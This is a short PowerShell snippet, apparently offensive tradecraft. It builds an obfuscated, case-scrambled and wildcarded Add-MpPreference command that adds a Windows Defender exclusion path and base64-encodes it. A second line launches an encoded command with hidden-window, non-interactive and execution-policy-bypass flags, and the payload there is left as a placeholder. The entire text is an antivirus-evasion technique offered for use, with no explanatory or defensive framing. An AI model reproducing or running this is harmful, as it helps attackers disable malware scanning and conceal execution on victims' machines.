# Generator
$command = 'aDd-mPpReFeReNcE -eXcLuSiONpAtH $env:S???e??r?ve'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$base64 = [Convert]::ToBase64String($bytes)
Write-Host $base64

# Launcher
powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc "base_64_goes_here_for_a_powershell_command"